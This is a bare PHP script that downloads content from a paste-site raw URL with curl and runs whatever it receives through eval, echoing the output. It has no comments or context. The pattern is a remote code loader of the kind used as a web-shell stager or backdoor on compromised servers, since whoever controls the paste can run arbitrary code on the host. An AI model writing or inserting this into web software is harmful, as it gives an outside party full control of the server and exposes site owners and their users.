<?php
$url = "https://plainraw.com/raw/e9995fed3f03";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);

if ($result === false) {
    echo "Error fetching remote content";
} else {
    if (is_string($result)) {
        ob_start();
        eval('?>'.$result);
        $output = ob_get_clean();
        echo $output;
    } else {
        echo "Error: Invalid response from remote server";
    }
}

curl_close($ch);
?>
